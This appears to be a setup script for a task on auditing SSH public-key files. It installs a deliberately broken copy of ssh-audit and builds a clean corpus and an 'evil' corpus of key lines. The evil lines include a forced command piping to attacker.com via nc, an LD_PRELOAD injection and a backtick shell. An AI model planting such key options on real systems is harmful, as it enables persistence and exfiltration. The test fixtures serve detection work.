#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip openssh-client
    pip3 install pytest

    # Create directories
    mkdir -p /app/ssh-audit-3.1.0 /app/corpora/clean /app/corpora/evil

    # 1. Vendored Package Perturbation
    cat << 'EOF' > /app/ssh-audit-3.1.0/ssh-audit.py
#!/usr/bin/env python3
# import sys  # Perturbation: commented out
def main():
    try:
        sys.exit(0)
    except NameError:
        print("NameError: name 'sys' is not defined")
        exit(1)
if __name__ == "__main__":
    main()
EOF
    chmod +x /app/ssh-audit-3.1.0/ssh-audit.py

    # 2. Corpora Setup
    # Clean Corpus
    cat << 'EOF' > /app/corpora/clean/valid1.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGabc123 test@localhost
EOF
    cat << 'EOF' > /app/corpora/clean/valid2.pub
restrict,command="/usr/bin/rsync" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGdef456 backup@server
EOF

    # Evil Corpus
    cat << 'EOF' > /app/corpora/evil/evil1_weak.pub
ssh-dss AAAAB3NzaC1kc3MAAACBA... old_admin
EOF
    cat << 'EOF' > /app/corpora/evil/evil2_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADA... legacy_user
EOF
    cat << 'EOF' > /app/corpora/evil/evil3_injection.pub
command="echo 'pwned' | nc attacker.com 1337" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGhij789 hacker
EOF
    cat << 'EOF' > /app/corpora/evil/evil4_env.pub
environment="LD_PRELOAD=/tmp/malicious.so" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGklm012 hacker2
EOF
    cat << 'EOF' > /app/corpora/evil/evil5_backtick.pub
command="`/bin/sh`" ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAI... hacker3
EOF

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
